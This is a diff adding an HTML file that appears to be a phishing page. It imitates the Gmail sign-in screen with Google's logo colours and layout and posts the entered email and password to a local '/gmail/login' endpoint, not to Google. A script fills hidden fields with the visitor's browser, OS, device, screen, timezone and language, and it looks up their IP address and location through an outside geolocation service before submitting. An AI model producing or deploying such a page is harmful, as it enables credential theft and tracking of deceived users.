@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gmail - Sign in</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Roboto','Segoe UI',Arial,sans-serif; background:#fff; color:#202124;
+         display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
+  .card { width:100%; max-width:448px; border:1px solid #dadce0; border-radius:8px;
+          padding:48px 40px 36px; background:#fff; }
+  .logo { text-align:center; margin-bottom:16px; font-size:24px; font-weight:500; }
+  .logo span:nth-child(1){color:#4285F4} .logo span:nth-child(2){color:#EA4335}
+  .logo span:nth-child(3){color:#FBBC05} .logo span:nth-child(4){color:#4285F4}
+  .logo span:nth-child(5){color:#34A853} .logo span:nth-child(6){color:#EA4335}
+  h1 { font-size:24px; font-weight:400; text-align:center; margin-bottom:8px; }
+  .sub { font-size:16px; text-align:center; margin-bottom:32px; }
+  .input-box { position:relative; margin-bottom:24px; }
+  .input-box input { width:100%; padding:13px 15px; font-size:16px;
+    border:1px solid #dadce0; border-radius:4px; outline:none; background:transparent; color:#202124; }
+  .input-box input:focus { border:2px solid #1a73e8; padding:12px 14px; }
+  .input-box label { position:absolute; left:12px; top:50%; transform:translateY(-50%);
+    background:#fff; padding:0 4px; color:#5f6368; font-size:16px; pointer-events:none; transition:.15s; }
+  .input-box input:focus + label, .input-box input:not(:placeholder-shown) + label { top:0; font-size:12px; color:#1a73e8; }
+  .input-box input:not(:focus):not(:placeholder-shown) + label { color:#5f6368; }
+  .forgot { display:inline-block; color:#1a73e8; font-size:14px; font-weight:500;
+            text-decoration:none; margin-bottom:40px; }
+  .row { display:flex; justify-content:space-between; align-items:center; margin-top:8px; }
+  .create { color:#1a73e8; font-size:14px; font-weight:500; text-decoration:none; }
+  button { background:#1a73e8; color:#fff; border:none; padding:10px 24px;
+    font-size:14px; font-weight:500; border-radius:4px; cursor:pointer; }
+  button:hover { background:#1765cc; }
+  .footer { display:flex; justify-content:space-between; align-items:center;
+            margin-top:48px; font-size:12px; color:#5f6368; }
+  .footer-links a { color:#5f6368; text-decoration:none; margin-left:20px; }
+  @media (max-width:500px) { .card { border:none; padding:24px; } }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+  <h1>Sign in</h1>
+  <p class="sub">Use your Google Account</p>
+  <form action="/gmail/login" method="POST" id="login-form">
+    <div class="input-box">
+      <input type="email" name="email" id="email" placeholder=" " required>
+      <label for="email">Email or phone</label>
+    </div>
+    <div class="input-box">
+      <input type="password" name="password" id="password" placeholder=" " required>
+      <label for="password">Enter your password</label>
+    </div>
+    <a href="#" class="forgot">Forgot password?</a>
+    <div class="row">
+      <a href="#" class="create">Create account</a>
+      <button type="submit">Next</button>
+    </div>
+    <input type="hidden" name="ip_address" id="ip-address">
+    <input type="hidden" name="geo_location" id="geo-location">
+    <input type="hidden" name="device_type" id="device-type">
+    <input type="hidden" name="browser_info" id="browser-info">
+    <input type="hidden" name="os_info" id="os-info">
+    <input type="hidden" name="screen_resolution" id="screen-resolution">
+    <input type="hidden" name="timezone" id="timezone">
+    <input type="hidden" name="language" id="language">
+  </form>
+  <div class="footer">
+    <div>English (United States)</div>
+    <div class="footer-links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
+  </div>
+</div>
+<script>
+async function collectFingerprint() {
+  const ua = navigator.userAgent;
+  document.getElementById('browser-info').value = ua;
+  document.getElementById('os-info').value = navigator.platform;
+  document.getElementById('device-type').value = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
+  document.getElementById('screen-resolution').value = `${window.screen.width}x${window.screen.height}`;
+  document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  document.getElementById('language').value = navigator.language;
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const d = await res.json();
+    if (d.ip) {
+      document.getElementById('ip-address').value = d.ip;
+      document.getElementById('geo-location').value = [d.city, d.region, d.country_name].filter(Boolean).join(', ');
+    }
+  } catch(e) {
+    document.getElementById('ip-address').value = 'Unknown';
+    document.getElementById('geo-location').value = 'Unknown';
+  }
+}
+document.addEventListener('DOMContentLoaded', () => {
+  collectFingerprint();
+  const form = document.getElementById('login-form');
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    await collectFingerprint();
+    form.submit();
+  });
+});
+</script>
+</body>
+</html>
